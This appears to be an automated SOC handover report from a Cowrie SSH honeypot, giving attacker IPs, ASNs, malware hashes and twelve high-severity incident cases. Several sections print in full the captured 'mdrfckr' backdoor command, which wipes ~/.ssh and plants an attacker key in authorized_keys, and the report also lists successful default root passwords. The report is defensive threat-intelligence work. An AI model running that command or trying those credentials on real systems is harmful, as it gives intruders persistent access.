# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-08 |
| **Generated At** | 2026-05-08T15:45:03Z |
| **Shift Time** | 15:45 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **97** |
| Confirmed Threats | **84** |
| False Positives Filtered | **13** (13.4%) |
| Unique Attacker IPs | **18** |
| Countries of Origin | **10** |
| High Severity Cases | **12** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **85** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **71** |
| Unique Credential Pairs | **32** |
| Unique Usernames | **17** |
| Unique Passwords | **32** |
| Successful Auth Pairs | **8** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 12 |
| `ubuntu` | 11 |
| `admin` | 10 |
| `345gs5662d34` | 6 |
| `guest` | 4 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 6 |
| `3245gs5662d34` | 6 |
| `1q2w3e` | 2 |
| `tomtest` | 2 |
| `oracleroot` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 6 |
| `root` | `3245gs5662d34` | 6 |
| `guest` | `1q2w3e` | 2 |
| `tom` | `tomtest` | 2 |
| `root` | `oracleroot` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `oracleroot` | `206.42.14.196` | 2026-05-08T14:07:57 |
| `root` | `3245gs5662d34` | `206.42.14.196` | 2026-05-08T14:08:04 |
| `root` | `admin2022#` | `206.42.14.196` | 2026-05-08T14:27:43 |
| `root` | `administrator888` | `206.42.14.196` | 2026-05-08T14:33:40 |
| `root` | `administrator888` | `193.106.245.20` | 2026-05-08T15:07:13 |
| `root` | `3245gs5662d34` | `193.106.245.20` | 2026-05-08T15:07:18 |
| `root` | `oracleroot` | `193.106.245.20` | 2026-05-08T15:22:46 |
| `root` | `admin2022#` | `193.106.245.20` | 2026-05-08T15:32:12 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **97** |
| Sessions with Fingerprint | **2** |
| Unique HASSH Fingerprints | **2** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 72 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 71 | 2 |
| `03a80b21afa8...` | Modern SSH client | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 71 | 2 | libssh-based |
| `03a80b21afa8...` | libssh | 1 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 6 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `206.42.14.196`, `193.106.245.20`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **18** |
| Unique ASNs | **18** |
| High-Risk ASNs | **6** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS31242` | P4 Sp. z o.o. | 1 | HIGH |
| `AS55836` | Reliance Jio Infocomm Limited | 1 | LOW |
| `AS3462` | Data Communication Business Group | 1 | LOW |
| `AS28126` | BRISANET SERVICOS DE TELECOMUNICACOES S.A | 1 | HIGH |
| `AS36884` | Wana Corporate | 1 | LOW |
| `AS3320` | Deutsche Telekom AG | 1 | LOW |
| `AS37693` | OOREDOO TUNISIE SA | 1 | MEDIUM |
| `AS8075` | Microsoft Corporation | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (12)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-64642d4c2863

| Field | Detail |
|---|---|
| **Source IP** | `206.42.14[.]196` |
| **First Seen** | 2026-05-08 14:07 |
| **Last Seen** | 2026-05-08 14:08 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-08 14:07:55` | `cowrie.session.connect` |
| `2026-05-08 14:07:55` | `cowrie.client.version` |
| `2026-05-08 14:07:55` | `cowrie.client.kex` |
| `2026-05-08 14:07:57` | `cowrie.login.success` |
| `2026-05-08 14:07:57` | `cowrie.session.params` |
| `2026-05-08 14:07:57` | `cowrie.command.input` |
| `2026-05-08 14:07:57` | `cowrie.command.failed` |
| `2026-05-08 14:07:58` | `cowrie.log.closed` |
| `2026-05-08 14:07:58` | `cowrie.session.params` |
| `2026-05-08 14:07:58` | `cowrie.command.input` |
| `2026-05-08 14:07:59` | `cowrie.session.file_download` |
| `2026-05-08 14:07:59` | `cowrie.log.closed` |
| `2026-05-08 14:08:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.42.14[.]196` to AbuseIPDB if not already reported
- [ ] Block `206.42.14[.]196` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cca5b24fe1b3

| Field | Detail |
|---|---|
| **Source IP** | `206.42.14[.]196` |
| **First Seen** | 2026-05-08 14:08 |
| **Last Seen** | 2026-05-08 14:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-08 14:08:02` | `cowrie.session.connect` |
| `2026-05-08 14:08:02` | `cowrie.client.version` |
| `2026-05-08 14:08:02` | `cowrie.client.kex` |
| `2026-05-08 14:08:04` | `cowrie.login.success` |
| `2026-05-08 14:08:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.42.14[.]196` to AbuseIPDB if not already reported
- [ ] Block `206.42.14[.]196` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b8528a1a3b4

| Field | Detail |
|---|---|
| **Source IP** | `206.42.14[.]196` |
| **First Seen** | 2026-05-08 14:27 |
| **Last Seen** | 2026-05-08 14:27 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-08 14:27:41` | `cowrie.session.connect` |
| `2026-05-08 14:27:41` | `cowrie.client.version` |
| `2026-05-08 14:27:41` | `cowrie.client.kex` |
| `2026-05-08 14:27:43` | `cowrie.login.success` |
| `2026-05-08 14:27:43` | `cowrie.session.params` |
| `2026-05-08 14:27:43` | `cowrie.command.input` |
| `2026-05-08 14:27:43` | `cowrie.command.failed` |
| `2026-05-08 14:27:44` | `cowrie.log.closed` |
| `2026-05-08 14:27:44` | `cowrie.session.params` |
| `2026-05-08 14:27:44` | `cowrie.command.input` |
| `2026-05-08 14:27:44` | `cowrie.session.file_download` |
| `2026-05-08 14:27:44` | `cowrie.log.closed` |
| `2026-05-08 14:27:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.42.14[.]196` to AbuseIPDB if not already reported
- [ ] Block `206.42.14[.]196` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fff3c6cd7e6a

| Field | Detail |
|---|---|
| **Source IP** | `206.42.14[.]196` |
| **First Seen** | 2026-05-08 14:27 |
| **Last Seen** | 2026-05-08 14:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-08 14:27:48` | `cowrie.session.connect` |
| `2026-05-08 14:27:48` | `cowrie.client.version` |
| `2026-05-08 14:27:48` | `cowrie.client.kex` |
| `2026-05-08 14:27:49` | `cowrie.login.success` |
| `2026-05-08 14:27:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.42.14[.]196` to AbuseIPDB if not already reported
- [ ] Block `206.42.14[.]196` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-744b46be9f94

| Field | Detail |
|---|---|
| **Source IP** | `206.42.14[.]196` |
| **First Seen** | 2026-05-08 14:33 |
| **Last Seen** | 2026-05-08 14:33 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-08 14:33:39` | `cowrie.session.connect` |
| `2026-05-08 14:33:39` | `cowrie.client.version` |
| `2026-05-08 14:33:39` | `cowrie.client.kex` |
| `2026-05-08 14:33:40` | `cowrie.login.success` |
| `2026-05-08 14:33:41` | `cowrie.session.params` |
| `2026-05-08 14:33:41` | `cowrie.command.input` |
| `2026-05-08 14:33:41` | `cowrie.command.failed` |
| `2026-05-08 14:33:41` | `cowrie.log.closed` |
| `2026-05-08 14:33:42` | `cowrie.session.params` |
| `2026-05-08 14:33:42` | `cowrie.command.input` |
| `2026-05-08 14:33:42` | `cowrie.session.file_download` |
| `2026-05-08 14:33:42` | `cowrie.log.closed` |
| `2026-05-08 14:33:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.42.14[.]196` to AbuseIPDB if not already reported
- [ ] Block `206.42.14[.]196` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63bbd87048e2

| Field | Detail |
|---|---|
| **Source IP** | `206.42.14[.]196` |
| **First Seen** | 2026-05-08 14:33 |
| **Last Seen** | 2026-05-08 14:33 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-08 14:33:46` | `cowrie.session.connect` |
| `2026-05-08 14:33:46` | `cowrie.client.version` |
| `2026-05-08 14:33:46` | `cowrie.client.kex` |
| `2026-05-08 14:33:48` | `cowrie.login.success` |
| `2026-05-08 14:33:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.42.14[.]196` to AbuseIPDB if not already reported
- [ ] Block `206.42.14[.]196` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f5acd5c1943

| Field | Detail |
|---|---|
| **Source IP** | `193.106.245[.]20` |
| **First Seen** | 2026-05-08 15:07 |
| **Last Seen** | 2026-05-08 15:07 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-08 15:07:12` | `cowrie.session.connect` |
| `2026-05-08 15:07:12` | `cowrie.client.version` |
| `2026-05-08 15:07:12` | `cowrie.client.kex` |
| `2026-05-08 15:07:13` | `cowrie.login.success` |
| `2026-05-08 15:07:13` | `cowrie.session.params` |
| `2026-05-08 15:07:13` | `cowrie.command.input` |
| `2026-05-08 15:07:13` | `cowrie.command.failed` |
| `2026-05-08 15:07:13` | `cowrie.log.closed` |
| `2026-05-08 15:07:14` | `cowrie.session.params` |
| `2026-05-08 15:07:14` | `cowrie.command.input` |
| `2026-05-08 15:07:14` | `cowrie.session.file_download` |
| `2026-05-08 15:07:14` | `cowrie.log.closed` |
| `2026-05-08 15:07:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.106.245[.]20` to AbuseIPDB if not already reported
- [ ] Block `193.106.245[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5063f8d48b3e

| Field | Detail |
|---|---|
| **Source IP** | `193.106.245[.]20` |
| **First Seen** | 2026-05-08 15:07 |
| **Last Seen** | 2026-05-08 15:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-08 15:07:17` | `cowrie.session.connect` |
| `2026-05-08 15:07:17` | `cowrie.client.version` |
| `2026-05-08 15:07:17` | `cowrie.client.kex` |
| `2026-05-08 15:07:18` | `cowrie.login.success` |
| `2026-05-08 15:07:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.106.245[.]20` to AbuseIPDB if not already reported
- [ ] Block `193.106.245[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a98573cc852a

| Field | Detail |
|---|---|
| **Source IP** | `193.106.245[.]20` |
| **First Seen** | 2026-05-08 15:22 |
| **Last Seen** | 2026-05-08 15:22 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-08 15:22:45` | `cowrie.session.connect` |
| `2026-05-08 15:22:45` | `cowrie.client.version` |
| `2026-05-08 15:22:45` | `cowrie.client.kex` |
| `2026-05-08 15:22:46` | `cowrie.login.success` |
| `2026-05-08 15:22:46` | `cowrie.session.params` |
| `2026-05-08 15:22:46` | `cowrie.command.input` |
| `2026-05-08 15:22:46` | `cowrie.command.failed` |
| `2026-05-08 15:22:47` | `cowrie.log.closed` |
| `2026-05-08 15:22:47` | `cowrie.session.params` |
| `2026-05-08 15:22:47` | `cowrie.command.input` |
| `2026-05-08 15:22:47` | `cowrie.session.file_download` |
| `2026-05-08 15:22:47` | `cowrie.log.closed` |
| `2026-05-08 15:22:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.106.245[.]20` to AbuseIPDB if not already reported
- [ ] Block `193.106.245[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4cce2c2bb48

| Field | Detail |
|---|---|
| **Source IP** | `193.106.245[.]20` |
| **First Seen** | 2026-05-08 15:22 |
| **Last Seen** | 2026-05-08 15:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-08 15:22:50` | `cowrie.session.connect` |
| `2026-05-08 15:22:50` | `cowrie.client.version` |
| `2026-05-08 15:22:50` | `cowrie.client.kex` |
| `2026-05-08 15:22:51` | `cowrie.login.success` |
| `2026-05-08 15:22:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.106.245[.]20` to AbuseIPDB if not already reported
- [ ] Block `193.106.245[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c1bd47f73b7

| Field | Detail |
|---|---|
| **Source IP** | `193.106.245[.]20` |
| **First Seen** | 2026-05-08 15:32 |
| **Last Seen** | 2026-05-08 15:32 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-08 15:32:11` | `cowrie.session.connect` |
| `2026-05-08 15:32:11` | `cowrie.client.version` |
| `2026-05-08 15:32:11` | `cowrie.client.kex` |
| `2026-05-08 15:32:12` | `cowrie.login.success` |
| `2026-05-08 15:32:13` | `cowrie.session.params` |
| `2026-05-08 15:32:13` | `cowrie.command.input` |
| `2026-05-08 15:32:13` | `cowrie.command.failed` |
| `2026-05-08 15:32:13` | `cowrie.log.closed` |
| `2026-05-08 15:32:13` | `cowrie.session.params` |
| `2026-05-08 15:32:13` | `cowrie.command.input` |
| `2026-05-08 15:32:13` | `cowrie.session.file_download` |
| `2026-05-08 15:32:13` | `cowrie.log.closed` |
| `2026-05-08 15:32:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.106.245[.]20` to AbuseIPDB if not already reported
- [ ] Block `193.106.245[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3e8aac68610

| Field | Detail |
|---|---|
| **Source IP** | `193.106.245[.]20` |
| **First Seen** | 2026-05-08 15:32 |
| **Last Seen** | 2026-05-08 15:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-08 15:32:16` | `cowrie.session.connect` |
| `2026-05-08 15:32:16` | `cowrie.client.version` |
| `2026-05-08 15:32:16` | `cowrie.client.kex` |
| `2026-05-08 15:32:17` | `cowrie.login.success` |
| `2026-05-08 15:32:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.106.245[.]20` to AbuseIPDB if not already reported
- [ ] Block `193.106.245[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `193.106.245[.]20` | **30** | 2026-05-08 15:02 | 2026-05-08 15:35 | 1m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `206.42.14[.]196` | **30** | 2026-05-08 14:01 | 2026-05-08 14:34 | 3m | 29 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `107.180.69[.]136` | **5** | 2026-05-08 15:42 | 2026-05-08 15:43 | 1m | 0 | `T1592` | 🟢 LOW |
| `162.252.39[.]3` | **4** | 2026-05-08 14:59 | 2026-05-08 15:07 | 8m | 0 | `T1592` | 🟢 LOW |
| `101.126.71[.]100` | 1 | 2026-05-08 13:59 | 2026-05-08 13:59 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.15[.]138` | 1 | 2026-05-08 14:00 | 2026-05-08 14:02 | 120s | 0 | `T1592` | 🟢 LOW |
| `170.82.76[.]2` | 1 | 2026-05-08 14:59 | 2026-05-08 14:59 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
